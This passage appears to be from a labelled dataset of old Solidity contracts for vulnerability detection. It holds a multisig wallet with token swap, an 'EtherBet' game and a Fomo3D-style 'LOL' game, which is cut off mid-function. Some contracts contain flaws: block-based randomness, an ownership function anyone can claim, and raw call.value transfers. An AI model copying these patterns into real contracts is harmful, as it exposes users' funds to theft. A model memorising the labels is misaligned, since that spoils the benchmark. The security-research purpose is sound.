0); } function confirmAndCheck(bytes32 _operation) internal returns (bool) { uint ownerIndex = m_ownerIndex[uint(msg.sender)]; if (ownerIndex == 0) return; var pending = m_pending[_operation]; if (pending.yetNeeded == 0) { pending.yetNeeded = m_required; pending.ownersDone = 0; pending.index = m_pendingIndex.length++; m_pendingIndex[pending.index] = _operation; } uint ownerIndexBit = 2**ownerIndex; if (pending.ownersDone & ownerIndexBit == 0) { Confirmation(msg.sender, _operation); if (pending.yetNeeded <= 1) { delete m_pendingIndex[m_pending[_operation].index]; delete m_pending[_operation]; return true; } else { pending.yetNeeded--; pending.ownersDone |= ownerIndexBit; } } } function reorganizeOwners() private { uint free = 1; while (free < m_numOwners) { while (free < m_numOwners && m_owners[free] != 0) free++; while (m_numOwners > 1 && m_owners[m_numOwners] == 0) m_numOwners--; if (free < m_numOwners && m_owners[m_numOwners] != 0 && m_owners[free] == 0) { m_owners[free] = m_owners[m_numOwners]; m_ownerIndex[m_owners[free]] = free; m_owners[m_numOwners] = 0; } } } function clearPending() internal { uint length = m_pendingIndex.length; for (uint i = 0; i < length; ++i) if (m_pendingIndex[i] != 0) delete m_pending[m_pendingIndex[i]]; delete m_pendingIndex; } uint public m_required; uint public m_numOwners; uint[256] m_owners; uint constant c_maxOwners = 250; mapping(uint => uint) m_ownerIndex; mapping(bytes32 => PendingState) m_pending; bytes32[] m_pendingIndex; } contract daylimit is multiowned { modifier limitedDaily(uint _value) { if (underLimit(_value)) _; } function daylimit(uint _limit) { m_dailyLimit = _limit; m_lastDay = today(); } function setDailyLimit(uint _newLimit) onlymanyowners(sha3(msg.data)) external { m_dailyLimit = _newLimit; } function resetSpentToday() onlymanyowners(sha3(msg.data)) external { m_spentToday = 0; } function underLimit(uint _value) internal onlyowner returns (bool) { if (today() > m_lastDay) { m_spentToday = 0; m_lastDay = today(); } if (m_spentToday + _value >= m_spentToday && m_spentToday + _value <= m_dailyLimit) { m_spentToday += _value; return true; } return false; } function today() private constant returns (uint) { return now / 1 days; } uint public m_dailyLimit; uint public m_spentToday; uint public m_lastDay; } contract multisig { event Deposit(address _from, uint value); event SingleTransact(address owner, uint value, address to, bytes data); event MultiTransact(address owner, bytes32 operation, uint value, address to, bytes data); event ConfirmationNeeded(bytes32 operation, address initiator, uint value, address to, bytes data); function changeOwner(address _from, address _to) external; function execute(address _to, uint _value, bytes _data) external returns (bytes32); function confirm(bytes32 _h) returns (bool); } contract tokenswap is multisig, multiowned { Token public tokenCtr; bool public tokenSwap; uint public constant SWAP_LENGTH = 4  weeks; uint public constant MAX_ETH = 700000 ether; uint public amountRaised; modifier isZeroValue { if (msg.value == 0) throw; _; } modifier isOverCap { if (amountRaised + msg.value > MAX_ETH) throw; _; } modifier isSwapStopped { if (!tokenSwap) throw; _; } modifier areConditionsSatisfied { if (tokenCtr.creationTime() + SWAP_LENGTH < now) { tokenCtr.disableTokenSwapLock(); tokenSwap = false; } else { _; if (amountRaised == MAX_ETH) { tokenCtr.disableTokenSwapLock(); tokenSwap = false; } } } function safeToAdd(uint a, uint b) internal returns (bool) { return (a + b >= a && a + b >= b); } function startTokenSwap() onlyowner { tokenSwap = true; } function stopTokenSwap() onlyowner { tokenSwap = false; } function setTokenContract(address newTokenContractAddr) onlyowner { if (newTokenContractAddr == address(0x0)) throw; if (tokenCtr != address(0x0)) throw; tokenCtr = Token(newTokenContractAddr); } function buyTokens(address _beneficiary) payable isZeroValue isOverCap isSwapStopped areConditionsSatisfied { Deposit(msg.sender, msg.value); tokenCtr.mintTokens(_beneficiary, msg.value); if (!safeToAdd(amountRaised, msg.value)) throw; amountRaised += msg.value; } } contract Wallet is multisig, multiowned, daylimit, tokenswap { struct Transaction { address to; uint value; bytes data; } function Wallet(address[] _owners, uint _required, uint _daylimit) multiowned(_owners, _required) daylimit(_daylimit) { } function kill(address _to) onlymanyowners(sha3(msg.data)) external { if (tokenCtr.tokenSwapLock()) throw; suicide(_to); } function() payable { buyTokens(msg.sender); } function execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 _r) { if (_to == address(tokenCtr)) throw; if (underLimit(_value)) { SingleTransact(msg.sender, _value, _to, _data); if(!_to.call.value(_value)(_data)) return 0; } _r = sha3(msg.data, block.number); if (!confirm(_r) && m_txs[_r].to == 0) { m_txs[_r].to = _to; m_txs[_r].value = _value; m_txs[_r].data = _data; ConfirmationNeeded(_r, msg.sender, _value, _to, _data); } } function confirm(bytes32 _h) onlymanyowners(_h) returns (bool) { if (m_txs[_h].to != 0) { if(!m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data)) MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data); delete m_txs[_h]; return true; } } function clearPending() internal { uint length = m_pendingIndex.length; for (uint i = 0; i < length; ++i) delete m_txs[m_pendingIndex[i]]; super.clearPending(); } mapping (bytes32 => Transaction) m_txs; } "}
{"sol name": "9221.sol", "label": 0, "first path": "function bet() payable { if ((random()%2==1) && (msg.value == 1 ether) && (!locked))  { if (!msg.sender.call.value(2 ether)()) throw; function releaseFunds(uint amount) { if (gameOwner==msg.sender)  { if (!msg.sender.call.value( amount * (1 ether))()) throw; ", "second path": "function bet() payable { if ((random()%2==1) && (msg.value == 1 ether) && (!locked))  { if (!msg.sender.call.value(2 ether)()) throw; function releaseFunds(uint amount) { if (gameOwner==msg.sender)  { if (!msg.sender.call.value( amount * (1 ether))()) throw; ", "third path": "function bet() payable { if ((random()%2==1) && (msg.value == 1 ether) && (!locked))  { if (!msg.sender.call.value(2 ether)()) throw; function releaseFunds(uint amount) { if (gameOwner==msg.sender)  { if (!msg.sender.call.value( amount * (1 ether))()) throw; ", "long path": "pragma solidity ^0.4.24; contract EtherBet{ address gameOwner = address(0); bool locked = false; function bet() payable { if ((random()%2==1) && (msg.value == 1 ether) && (!locked))  { if (!msg.sender.call.value(2 ether)()) throw; } } function lock() { if (gameOwner==msg.sender) { locked = true; } } function unlock()  { if (gameOwner==msg.sender) { locked = false; } } function own(address owner) { if ((gameOwner == address(0)) || (gameOwner == msg.sender)) { gameOwner = owner; } } function releaseFunds(uint amount) { if (gameOwner==msg.sender)  { if (!msg.sender.call.value( amount * (1 ether))()) throw; } } function random() view returns (uint8) { return uint8(uint256(keccak256(block.timestamp, block.difficulty))%256); } function () public  payable { bet(); } } "}
{"sol name": "3255.sol", "label": 0, "first path": "function endRound(LOLdatasets.EventReturns memory _eventData_) private returns (LOLdatasets.EventReturns) uint256 _rID = rID_; uint256 _winPID = round_[_rID].plyr; uint256 _winTID = round_[_rID].team; uint256 _pot = round_[_rID].pot; uint256 _win = (_pot.mul(48)) / 100; uint256 _com = (_pot / 50); uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100; uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100; uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d); uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys); uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000); if (_dust > 0) _gen = _gen.sub(_dust); _res = _res.add(_dust); plyr_[_winPID].win = _win.add(plyr_[_winPID].win); if (!address(lol_offical_bank).call.value(_com)(bytes4(keccak256(\"deposit()\")))) _p3d = _p3d.add(_com); _com = 0; round_[_rID].mask = _ppt.add(round_[_rID].mask); _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000); _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000); _eventData_.winnerAddr = plyr_[_winPID].addr; _eventData_.winnerName = plyr_[_winPID].name; _eventData_.amountWon = _win; _eventData_.genAmount = _gen; _eventData_.P3DAmount = 0; _eventData_.newPot = _res; rID_++; _rID++; round_[_rID].strt = now; round_[_rID].end = now.add(rndInit_).add(rndGap_); round_[_rID].pot = _res; return(_eventData_); function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, LOLdatasets.EventReturns memory _eventData_) private returns(LOLdatasets.EventReturns) uint256 _com = _eth / 50; uint256 _p3d; uint256 _aff = _eth / 10; if (_affID != _pID && plyr_[_affID].name != '') { plyr_[_affID].aff = _aff.add(plyr_[_affID].aff); emit LOLevents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now); } else { _com = _com.add(_aff); address(lol_offical_bank).call.value(_com)(bytes4(keccak256(\"deposit()\"))); return(_eventData_); ", "second path": "function endRound(LOLdatasets.EventReturns memory _eventData_) private returns (LOLdatasets.EventReturns) uint256 _rID = rID_; uint256 _winPID = round_[_rID].plyr; uint256 _winTID = round_[_rID].team; uint256 _pot = round_[_rID].pot; uint256 _win = (_pot.mul(48)) / 100; uint256 _com = (_pot / 50); uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100; uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100; uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d); uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys); uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000); if (_dust > 0) _gen = _gen.sub(_dust); _res = _res.add(_dust); plyr_[_winPID].win = _win.add(plyr_[_winPID].win); if (!address(lol_offical_bank).call.value(_com)(bytes4(keccak256(\"deposit()\")))) _p3d = _p3d.add(_com); _com = 0; round_[_rID].mask = _ppt.add(round_[_rID].mask); _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000); _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000); _eventData_.winnerAddr = plyr_[_winPID].addr; _eventData_.winnerName = plyr_[_winPID].name; _eventData_.amountWon = _win; _eventData_.genAmount = _gen; _eventData_.P3DAmount = 0; _eventData_.newPot = _res; rID_++; _rID++; round_[_rID].strt = now; round_[_rID].end = now.add(rndInit_).add(rndGap_); round_[_rID].pot = _res; return(_eventData_); function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, LOLdatasets.EventReturns memory _eventData_) private returns(LOLdatasets.EventReturns) uint256 _com = _eth / 50; uint256 _p3d; uint256 _aff = _eth / 10; if (_affID != _pID && plyr_[_affID].name != '') { plyr_[_affID].aff = _aff.add(plyr_[_affID].aff); emit LOLevents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now); } else { _com = _com.add(_aff); address(lol_offical_bank).call.value(_com)(bytes4(keccak256(\"deposit()\"))); return(_eventData_); ", "third path": "function endRound(LOLdatasets.EventReturns memory _eventData_) private returns (LOLdatasets.EventReturns) uint256 _rID = rID_; uint256 _winPID = round_[_rID].plyr; uint256 _winTID = round_[_rID].team; uint256 _pot = round_[_rID].pot; uint256 _win = (_pot.mul(48)) / 100; uint256 _com = (_pot / 50); uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100; uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100; uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d); uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys); uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000); if (_dust > 0) _gen = _gen.sub(_dust); _res = _res.add(_dust); plyr_[_winPID].win = _win.add(plyr_[_winPID].win); if (!address(lol_offical_bank).call.value(_com)(bytes4(keccak256(\"deposit()\")))) _p3d = _p3d.add(_com); _com = 0; round_[_rID].mask = _ppt.add(round_[_rID].mask); _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000); _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000); _eventData_.winnerAddr = plyr_[_winPID].addr; _eventData_.winnerName = plyr_[_winPID].name; _eventData_.amountWon = _win; _eventData_.genAmount = _gen; _eventData_.P3DAmount = 0; _eventData_.newPot = _res; rID_++; _rID++; round_[_rID].strt = now; round_[_rID].end = now.add(rndInit_).add(rndGap_); round_[_rID].pot = _res; return(_eventData_); function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, LOLdatasets.EventReturns memory _eventData_) private returns(LOLdatasets.EventReturns) uint256 _com = _eth / 50; uint256 _p3d; uint256 _aff = _eth / 10; if (_affID != _pID && plyr_[_affID].name != '') { plyr_[_affID].aff = _aff.add(plyr_[_affID].aff); emit LOLevents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now); } else { _com = _com.add(_aff); address(lol_offical_bank).call.value(_com)(bytes4(keccak256(\"deposit()\"))); return(_eventData_); ", "long path": "pragma solidity ^0.4.24; contract Owned { address public owner; address public newOwner; constructor() public { owner = msg.sender; } modifier onlyOwner { require(msg.sender == owner); _; } function transferOwnership(address _newOwner) public onlyOwner { newOwner = _newOwner; } function acceptOwnership() public { require(msg.sender == newOwner); owner = newOwner; newOwner = address(0); } } contract LOLevents { event onNewName ( uint256 indexed playerID, address indexed playerAddress, bytes32 indexed playerName, bool isNewPlayer, uint256 affiliateID, address affiliateAddress, bytes32 affiliateName, uint256 amountPaid, uint256 timeStamp ); event onEndTx ( uint256 compressedData, uint256 compressedIDs, bytes32 playerName, address playerAddress, uint256 ethIn, uint256 keysBought, address winnerAddr, bytes32 winnerName, uint256 amountWon, uint256 newPot, uint256 P3DAmount, uint256 genAmount, uint256 potAmount, uint256 airDropPot ); event onWithdraw ( uint256 indexed playerID, address playerAddress, bytes32 playerName, uint256 ethOut, uint256 timeStamp ); event onWithdrawAndDistribute ( address playerAddress, bytes32 playerName, uint256 ethOut, uint256 compressedData, uint256 compressedIDs, address winnerAddr, bytes32 winnerName, uint256 amountWon, uint256 newPot, uint256 P3DAmount, uint256 genAmount ); event onBuyAndDistribute ( address playerAddress, bytes32 playerName, uint256 ethIn, uint256 compressedData, uint256 compressedIDs, address winnerAddr, bytes32 winnerName, uint256 amountWon, uint256 newPot, uint256 P3DAmount, uint256 genAmount ); event onReLoadAndDistribute ( address playerAddress, bytes32 playerName, uint256 compressedData, uint256 compressedIDs, address winnerAddr, bytes32 winnerName, uint256 amountWon, uint256 newPot, uint256 P3DAmount, uint256 genAmount ); event onAffiliatePayout ( uint256 indexed affiliateID, address affiliateAddress, bytes32 affiliateName, uint256 indexed roundID, uint256 indexed buyerID, uint256 amount, uint256 timeStamp ); event onPotSwapDeposit ( uint256 roundID, uint256 amountAddedToPot ); } contract modularLong is LOLevents {} contract LOLlong is modularLong,Owned { using SafeMath for *; using NameFilter for string; using LOLKeysCalcLong for uint256; LOLOfficalBankInterface constant private lol_offical_bank = LOLOfficalBankInterface(0xF66E2D098D85b803D5ae710008fCc876c8656fFd); LOLPlayerBookInterface constant private PlayerBook = LOLPlayerBookInterface(0xb9Db77600A611c1DfC923c2c8b513cB1Fc4Fe113); string constant public name = \"LOL Official\"; string constant public symbol = \"LOL\"; uint256 private rndExtra_ = 1 hours; uint256 private rndGap_ = 24 hours; uint256 constant private rndInit_ = 1 hours; uint256 constant private rndInc_ = 30 seconds; uint256 constant private rndMax_ = 24 hours; uint256 public airDropPot_; uint256 public airDropTracker_ = 0; uint256 public rID_; mapping (address => uint256) public pIDxAddr_; mapping (bytes32 => uint256) public pIDxName_; mapping (uint256 => LOLdatasets.Player) public plyr_; mapping (uint256 => mapping (uint256 => LOLdatasets.PlayerRounds)) public plyrRnds_; mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_; mapping (uint256 => LOLdatasets.Round) public round_; mapping (uint256 => mapping(uint256 => uint256)) public rndTmEth_; mapping (uint256 => LOLdatasets.TeamFee) public fees_; mapping (uint256 => LOLdatasets.PotSplit) public potSplit_; constructor()  public    { fees_[0] = LOLdatasets.TeamFee(36,0); fees_[1] = LOLdatasets.TeamFee(43,0); fees_[2] = LOLdatasets.TeamFee(66,0); fees_[3] = LOLdatasets.TeamFee(51,0); potSplit_[0] = LOLdatasets.PotSplit(25,0); potSplit_[1] = LOLdatasets.PotSplit(25,0); potSplit_[2] = LOLdatasets.PotSplit(40,0); potSplit_[3] = LOLdatasets.PotSplit(40,0); } modifier isActivated() { require(activated_ == true, \"its not ready yet.  check ?eta in discord\"); _; } modifier isHuman() { address _addr = msg.sender; uint256 _codeLength; assembly {_codeLength := extcodesize(_addr)} require(_codeLength == 0, \"sorry humans only\"); _; } modifier isWithinLimits(uint256 _eth) { require(_eth >= 1000000000, \"pocket lint: not a valid currency\"); require(_eth <= 100000000000000000000000, \"no vitalik, no\"); _; } function() isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    { LOLdatasets.EventReturns memory _eventData_ = determinePID(_eventData_); uint256 _pID = pIDxAddr_[msg.sender]; buyCore(_pID, plyr_[_pID].laff, 2, _eventData_); } function buyXid(uint256 _affCode, uint256 _team) isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    { LOLdatasets.EventReturns memory _eventData_ = determinePID(_eventData_); uint256 _pID = pIDxAddr_[msg.sender]; if (_affCode == 0 || _affCode == _pID) { _affCode = plyr_[_pID].laff; } else if (_affCode != plyr_[_pID].laff) { plyr_[_pID].laff = _affCode; } _team = verifyTeam(_team); buyCore(_pID, _affCode, _team, _eventData_); } function buyXaddr(address _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    { LOLdatasets.EventReturns memory _eventData_ = determinePID(_eventData_); uint256 _pID = pIDxAddr_[msg.sender]; uint256 _affID; if (_affCode == address(0) || _affCode == msg.sender) { _affID = plyr_[_pID].laff; } else { _affID = pIDxAddr_[_affCode]; if (_affID != plyr_[_pID].laff) { plyr_[_pID].laff = _affID; } } _team = verifyTeam(_team); buyCore(_pID, _affID, _team, _eventData_); } function buyXname(bytes32 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    { LOLdatasets.EventReturns memory _eventData_ = determinePID(_eventData_); uint256 _pID = pIDxAddr_[msg.sender]; uint256 _affID; if (_affCode == '' || _affCode == plyr_[_pID].name) { _affID = plyr_[_pID].laff; } else { _affID = pIDxName_[_affCode]; if (_affID != plyr_[_pID].laff) { plyr_[_pID].laff = _affID; } } _team = verifyTeam(_team); buyCore(_pID, _affID, _team, _eventData_); } function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth)       isActivated()        isHuman()        isWithinLimits(_eth)        public    { LOLdatasets.EventReturns memory _eventData_; uint256 _pID = pIDxAddr_[msg.sender]; if (_affCode == 0 || _affCode == _pID) { _affCode = plyr_[_pID].laff; } else if (_affCode != plyr_[_pID].laff) { plyr_[_pID].laff = _affCode; } _team = verifyTeam(_team); reLoadCore(_pID, _affCode, _team, _eth, _eventData_); } function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    { LOLdatasets.EventReturns memory _eventData_; uint256 _pID = pIDxAddr_[msg.sender]; uint256 _affID; if (_affCode == address(0) || _affCode == msg.sender) { _affID = plyr_[_pID].laff; } else { _affID = pIDxAddr_[_affCode]; if (_affID != plyr_[_pID].laff) { plyr_[_pID].laff = _affID; } } _team = verifyTeam(_team); reLoadCore(_pID, _affID, _team, _eth, _eventData_); } function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    { LOLdatasets.EventReturns memory _eventData_; uint256 _pID = pIDxAddr_[msg.sender]; uint256 _affID; if (_affCode == '' || _affCode == plyr_[_pID].name) { _affID = plyr_[_pID].laff; } else { _affID = pIDxName_[_affCode]; if (_affID != plyr_[_pID].laff) { plyr_[_pID].laff = _affID; } } _team = verifyTeam(_team); reLoadCore(_pID, _affID, _team, _eth, _eventData_); } function withdraw()        isActivated()        isHuman()        public    { uint256 _rID = rID_; uint256 _now = now; uint256 _pID = pIDxAddr_[msg.sender]; uint256 _eth; if (_now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0) { LOLdatasets.EventReturns memory _eventData_; round_[_rID].ended = true; _eventData_ = endRound(_eventData_); _eth = withdrawEarnings(_pID); if (_eth > 0) plyr_[_pID].addr.transfer(_eth); _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000); _eventData_.compressedIDs = _eventData_.compressedIDs + _pID; emit LOLevents.onWithdrawAndDistribute ( msg.sender, plyr_[_pID].name, _eth, _eventData_.compressedData, _eventData_.compressedIDs, _eventData_.winnerAddr, _eventData_.winnerName, _eventData_.amountWon, _eventData_.newPot, _eventData_.P3DAmount, _eventData_.genAmount ); } else { _eth = withdrawEarnings(_pID); if (_eth > 0) plyr_[_pID].addr.transfer(_eth); emit LOLevents.onWithdraw(_pID, msg.sender, plyr_[_pID].name, _eth, _now); } } function registerNameXID(string _nameString, uint256 _affCode, bool _all)        isHuman()        public        payable    { bytes32 _name = _nameString.nameFilter(); address _addr = msg.sender; uint256 _paid = msg.value; (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXIDFromDapp.value(_paid)(_addr, _name, _affCode, _all); uint256 _pID = pIDxAddr_[_addr]; emit LOLevents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now); } function registerNameXaddr(string _nameString, address _affCode, bool _all)      isHuman()        public        payable    { bytes32 _name = _nameString.nameFilter(); address _addr = msg.sender; uint256 _paid = msg.value; (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXaddrFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all); uint256 _pID = pIDxAddr_[_addr]; emit LOLevents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now); } function registerNameXname(string _nameString, bytes32 _affCode, bool _all)        isHuman()        public        payable    { bytes32 _name = _nameString.nameFilter(); address _addr = msg.sender; uint256 _paid = msg.value; (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXnameFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all); uint256 _pID = pIDxAddr_[_addr]; emit LOLevents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now); } function getBuyPrice()       public         view        returns(uint256)    { uint256 _rID = rID_; uint256 _now = now; if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0))) return ( (round_[_rID].keys.add(1000000000000000000)).ethRec(1000000000000000000) ); else return ( 75000000000000 ); } function getTimeLeft() public view returns(uint256) { uint256 _rID = rID_; uint256 _now = now; if (_now < round_[_rID].end) if (_now > round_[_rID].strt + rndGap_) return( (round_[_rID].end).sub(_now) ); else return( (round_[_rID].strt + rndGap_).sub(_now) ); else return(0); } function getPlayerVaults(uint256 _pID) public view returns(uint256 ,uint256, uint256) { uint256 _rID = rID_; if (now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0) { if (round_[_rID].plyr == _pID) { return ( (plyr_[_pID].win).add( ((round_[_rID].pot).mul(48)) / 100 ), (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)   ), plyr_[_pID].aff ); } else { return ( plyr_[_pID].win, (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)  ), plyr_[_pID].aff ); } } else { return ( plyr_[_pID].win, (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)), plyr_[_pID].aff ); } } function getPlayerVaultsHelper(uint256 _pID, uint256 _rID) private view returns(uint256) { return(  ((((round_[_rID].mask).add(((((round_[_rID].pot).mul(potSplit_[round_[_rID].team].gen)) / 100).mul(1000000000000000000)) / (round_[_rID].keys))).mul(plyrRnds_[_pID][_rID].keys)) / 1000000000000000000)  ); } function getCurrentRoundInfo() public view returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256) { uint256 _rID = rID_; return ( round_[_rID].ico, _rID, round_[_rID].keys, round_[_rID].end, round_[_rID].strt, round_[_rID].pot, (round_[_rID].team + (round_[_rID].plyr * 10)), plyr_[round_[_rID].plyr].addr, plyr_[round_[_rID].plyr].name, rndTmEth_[_rID][0], rndTmEth_[_rID][1], rndTmEth_[_rID][2], rndTmEth_[_rID][3], airDropTracker_ + (airDropPot_ * 1000) ); } function getPlayerInfoByAddress(address _addr) public view returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256) { uint256 _rID = rID_; if (_addr == address(0)) { _addr == msg.sender; } uint256 _pID = pIDxAddr_[_addr]; return ( _pID, plyr_[_pID].name, plyrRnds_[_pID][_rID].keys, plyr_[_pID].win, (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)), plyr_[_pID].aff, plyrRnds_[_pID][_rID].eth ); } function buyCore(uint256 _pID, uint256 _affID, uint256 _team, LOLdatasets.EventReturns memory _eventData_) private { uint256 _rID = rID_; uint256 _now = now; if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0))) { core(_rID, _pID, msg.value, _affID, _team, _eventData_); } else { if (_now > round_[_rID].end && round_[_rID].ended == false) { round_[_rID].ended = true; _eventData_ = endRound(_eventData_); _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000); _eventData_.compressedIDs = _eventData_.compressedIDs + _pID; emit LOLevents.onBuyAndDistribute ( msg.sender, plyr_[_pID].name, msg.value, _eventData_.compressedData, _eventData_.compressedIDs, _eventData_.winnerAddr, _eventData_.winnerName, _eventData_.amountWon, _eventData_.newPot, _eventData_.P3DAmount, _eventData_.genAmount ); } plyr_[_pID].gen = plyr_[_pID].gen.add(msg.value); } } function reLoadCore(uint256 _pID, uint256 _affID, uint256 _team, uint256 _eth, LOLdatasets.EventReturns memory _eventData_) private { uint256 _rID = rID_; uint256 _now = now; if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0))) { plyr_[_pID].gen = withdrawEarnings(_pID).sub(_eth); core(_rID, _pID, _eth, _affID, _team, _eventData_); } else if (_now > round_[_rID].end && round_[_rID].ended == false) { round_[_rID].ended = true; _eventData_ = endRound(_eventData_); _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000); _eventData_.compressedIDs = _eventData_.compressedIDs + _pID; emit LOLevents.onReLoadAndDistribute ( msg.sender, plyr_[_pID].name, _eventData_.compressedData, _eventData_.compressedIDs, _eventData_.winnerAddr, _eventData_.winnerName, _eventData_.amountWon, _eventData_.newPot, _eventData_.P3DAmount, _eventData_.genAmount ); } } function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, LOLdatasets.EventReturns memory _eventData_) private { if (plyrRnds_[_pID][_rID].keys == 0) _eventData_ = managePlayer(_pID, _eventData_); if (_eth > 1000000000) { uint256 _keys = (round_[_rID].eth).keysRec(_eth); if (_keys >= 1000000000000000000) { updateTimer(_keys, _rID); if (round_[_rID].plyr != _pID) round_[_rID].plyr = _pID; if (round_[_rID].team != _team) round_[_rID].team = _team; _eventData_.compressedData = _eventData_.compressedData + 100; } if (_eth >= 100000000000000000) { airDropTracker_++; if (airdrop() == true) { uint256 _prize; if (_eth >= 10000000000000000000) { _prize = ((airDropPot_).mul(75)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 300000000000000000000000000000000; } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) { _prize = ((airDropPot_).mul(50)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 200000000000000000000000000000000; } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) { _prize = ((airDropPot_).mul(25)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 300000000000000000000000000000000; } _eventData_.compressedData += 10000000000000000000000000000000; _eventData_.compressedData += _prize * 1000000000000000000000000000000000; airDropTracker_ = 0; } } _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000); plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys); plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth); round_[_rID].keys = _keys.add(round_[_rID].keys); round_[_rID].eth = _eth.add(round_[_rID].eth); rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]); _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_); _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_); endTx(_pID, _team, _eth, _keys, _eventData_); } } function calcUnMaskedEarnings(uint256 _pID, uint256 _rIDlast) private view returns(uint256) { return(  (((round_[_rIDlast].mask).mul(plyrRnds_[_pID][_rIDlast].keys)) / (1000000000000000000)).sub(plyrRnds_[_pID][_rIDlast].mask)  ); } function calcKeysReceived(uint256 _rID, uint256 _eth) public view returns(uint256) { uint256 _now = now; if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0))) return ( (round_[_rID].eth).keysRec(_eth) ); else return ( (_eth).keys() ); } function iWantXKeys(uint256 _keys) public view returns(uint256) { uint256 _rID = rID_; uint256 _now = now; if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0))) return ( 